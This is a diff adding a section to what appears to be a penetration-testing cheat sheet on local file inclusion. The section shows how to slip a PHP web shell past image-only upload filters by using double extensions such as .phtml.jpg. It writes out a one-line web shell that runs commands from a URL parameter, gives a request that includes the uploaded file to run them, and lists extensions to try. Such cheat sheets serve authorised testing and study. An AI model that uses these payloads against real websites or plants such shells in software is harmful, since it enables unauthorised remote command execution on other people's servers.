@@ -357,6 +357,27 @@ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 http://TARGET/index.php?page=./uploads/shell.gif&cmd=id
 ```
 
+### PHP Extension Before Image Suffix
+
+If uploads only allow image extensions but the LFI uses `include()` / `require()`, try a filename that keeps a PHP-executable extension before the allowed suffix:
+
+```bash
+# Payload content can still start with image magic bytes if needed
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.phtml.jpg
+
+# Upload the file, then include the stored path through LFI
+http://TARGET/index.php?page=./uploads/shell.phtml.jpg&cmd=id
+```
+
+Useful extensions to try before `.jpg` / `.png`:
+
+```text
+.php.jpg
+.phtml.jpg
+.phar.jpg
+.pht.jpg
+```
+
 ### ZIP Wrapper
 
 ```bash
